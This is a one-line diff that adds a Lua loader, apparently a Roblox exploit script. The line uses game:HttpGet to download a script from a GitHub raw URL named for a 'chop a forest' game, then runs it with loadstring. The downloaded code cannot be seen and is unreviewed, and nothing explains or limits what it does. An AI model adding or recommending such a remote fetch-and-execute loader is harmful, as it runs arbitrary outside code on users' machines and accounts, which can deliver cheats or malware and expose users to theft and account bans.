@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/ch2-chop-a-forest-spam1-iz5qpaqiigfch0.lua"))()
